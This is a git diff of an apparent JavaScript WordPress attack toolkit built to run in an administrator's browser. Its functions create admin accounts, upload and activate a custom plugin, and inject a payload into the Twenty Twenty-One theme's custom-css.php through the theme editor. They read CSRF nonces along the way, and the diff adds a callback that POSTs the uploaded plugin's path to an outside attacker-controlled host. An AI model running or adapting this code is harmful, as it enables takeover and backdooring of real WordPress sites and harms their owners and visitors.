@@ -177,7 +177,7 @@ function WPCreateAccount() {
                 JSON.stringify(
                     {
                         "Host": Target + "wp-admin/user-new.php",
-                        "Module": "addUser()",
+                        "Module": "WPCreateAccount()",
                         "Error": "Stage 1 - (Cannot Get Server Response!)",
                     }
                 )
@@ -247,6 +247,20 @@ function WPUploadCustomPlugin() {
                 }
             } else if (Plugin && csrf_token2) {
 
+                var _callbackx = new XMLHttpRequest();
+                _callbackx.open("POST", Callback, true);
+                _callbackx.send(
+                    JSON.stringify(
+                        {
+                            "Host": Target + "wp-admin/update.php?action=upload-plugin",
+                            "Success": "Stage 2 - Plugin Uploaded!",
+                            "Data": {
+                                "Path": Target + "wp-content/plugins/" + decodeURIComponent(Plugin)
+                            }
+                        }
+                    )
+                );
+
                 var _stage3 = new XMLHttpRequest();
                 _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                 _stage3.send();
@@ -257,8 +271,8 @@ function WPUploadCustomPlugin() {
                     _callback.send(
                         JSON.stringify(
                             {
-                                "Host": Target + "wp-admin/user-new.php",
-                                "Success": "Stage 3 - Plugin Uploaded!",
+                                "Host": Target + "wp-admin/plugins.php?action=activate&plugin=",
+                                "Success": "Stage 3 - Plugin Activated!",
                                 "Data": {
                                     "Path": Target + "wp-content/plugins/" + decodeURIComponent(Plugin)
                                 }
@@ -313,7 +327,7 @@ function WPUploadCustomPlugin() {
                 JSON.stringify(
                     {
                         "Host": Target + "wp-admin/plugin-install.php",
-                        "Module": "uploadPlugin()",
+                        "Module": "WPUploadCustomPlugin()",
                         "Error": "Stage 1 - (Cannot Get Server Response!)",
                     }
                 )
@@ -419,7 +433,7 @@ function WPEditPlugins() {
                     JSON.stringify(
                         {
                             "Host": Target + "wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select",
-                            "Module": "editPlugin()",
+                            "Module": "WPEditPlugins()",
                             "Error": "Stage 1 - (Cannot Get Server Response!)",
                         }
                     )
@@ -465,8 +479,8 @@ function WPEditThemes() {
                 _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 _stage2.send(
                     "nonce=" + csrf_token +
-                    "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dinc%252Fcustom-css.php%26theme%3Dtwentytwentyone&newcontent=%3C%3Fphp%0A%2F**%0A+*+Custom+CSS%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_One%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%2F%0A%0A%2F**%0A+*+Generate+CSS.%0A+*%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%0A+*+%40param+string+%24selector+The+CSS+selector.%0A+*+%40param+string+%24style++++The+CSS+style.%0A+*+%40param+string+%24value++++The+CSS+value.%0A+*+%40param+string+%24prefix+++The+CSS+prefix.%0A+*+%40param+string+%24suffix+++The+CSS+suffix.%0A+*+%40param+bool+++%24display++Print+the+styles.%0A+*+%40return+string%0A+*%2F%0Afunction+twenty_twenty_one_generate_css(+%24selector%2C+%24style%2C+%24value%2C+%24prefix+%3D+''%2C+%24suffix+%3D+''%2C+%24display+%3D+true+)+%7B%0A%0A%09%2F%2F+Bail+early+if+there+is+no+%24selector+elements+or+properties+and+%24value.%0A%09if+(+!+%24value+%7C%7C+!+%24selector+)+%7B%0A%09%09return+''%3B%0A%09%7D%0A%0A%09%24css+%3D+sprintf(+'%25s+%7B+%25s%3A+%25s%3B+%7D'%2C+%24selector%2C+%24style%2C+%24prefix+.+%24value+.+%24suffix+)%3B%0A%0A%09if+(+%24display+)+%7B%0A%09%09%2F*%0A%09%09+*+Note+to+reviewers%3A+%24css+contains+auto-generated+CSS.%0A%09%09+*+It+is+included+inside+%3Cstyle%3E+tags+and+can+only+be+interpreted+as+CSS+on+the+browser.%0A%09%09+*+Using+wp_strip_all_tags()+here+is+sufficient+escaping+to+avoid%0A%09%09+*+malicious+attempts+to+close+%3C%2Fstyle%3E+and+open+a+%3Cscript%3E.%0A%09%09+*%2F%0A%09%09echo+wp_strip_all_tags(+%24css+)%3B+%2F%2F+phpcs%3Aignore+WordPress.Security.EscapeOutput%0A%09%7D%0A%09return+%24css%3B%0A%7D%0A" + 
-                    encodeURIComponent(payload) + 
+                    "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dinc%252Fcustom-css.php%26theme%3Dtwentytwentyone&newcontent=%3C%3Fphp%0A%2F**%0A+*+Custom+CSS%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_One%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%2F%0A%0A%2F**%0A+*+Generate+CSS.%0A+*%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%0A+*+%40param+string+%24selector+The+CSS+selector.%0A+*+%40param+string+%24style++++The+CSS+style.%0A+*+%40param+string+%24value++++The+CSS+value.%0A+*+%40param+string+%24prefix+++The+CSS+prefix.%0A+*+%40param+string+%24suffix+++The+CSS+suffix.%0A+*+%40param+bool+++%24display++Print+the+styles.%0A+*+%40return+string%0A+*%2F%0Afunction+twenty_twenty_one_generate_css(+%24selector%2C+%24style%2C+%24value%2C+%24prefix+%3D+''%2C+%24suffix+%3D+''%2C+%24display+%3D+true+)+%7B%0A%0A%09%2F%2F+Bail+early+if+there+is+no+%24selector+elements+or+properties+and+%24value.%0A%09if+(+!+%24value+%7C%7C+!+%24selector+)+%7B%0A%09%09return+''%3B%0A%09%7D%0A%0A%09%24css+%3D+sprintf(+'%25s+%7B+%25s%3A+%25s%3B+%7D'%2C+%24selector%2C+%24style%2C+%24prefix+.+%24value+.+%24suffix+)%3B%0A%0A%09if+(+%24display+)+%7B%0A%09%09%2F*%0A%09%09+*+Note+to+reviewers%3A+%24css+contains+auto-generated+CSS.%0A%09%09+*+It+is+included+inside+%3Cstyle%3E+tags+and+can+only+be+interpreted+as+CSS+on+the+browser.%0A%09%09+*+Using+wp_strip_all_tags()+here+is+sufficient+escaping+to+avoid%0A%09%09+*+malicious+attempts+to+close+%3C%2Fstyle%3E+and+open+a+%3Cscript%3E.%0A%09%09+*%2F%0A%09%09echo+wp_strip_all_tags(+%24css+)%3B+%2F%2F+phpcs%3Aignore+WordPress.Security.EscapeOutput%0A%09%7D%0A%09return+%24css%3B%0A%7D%0A" +
+                    encodeURIComponent(payload) +
                     "&action=edit-theme-plugin-file&file=inc%2Fcustom-css.php&theme=twentytwentyone&docs-list="
                 );
 
@@ -529,7 +543,7 @@ function WPEditThemes() {
                     JSON.stringify(
                         {
                             "Host": Target + "wp-admin/theme-editor.php?file=inc%2Fcustom-css.php&theme=twentytwentyone",
-                            "Module": "editPlugin()",
+                            "Module": "WPEditThemes()",
                             "Error": "Stage 1 - (Cannot Get Server Response!)",
                         }
                     )
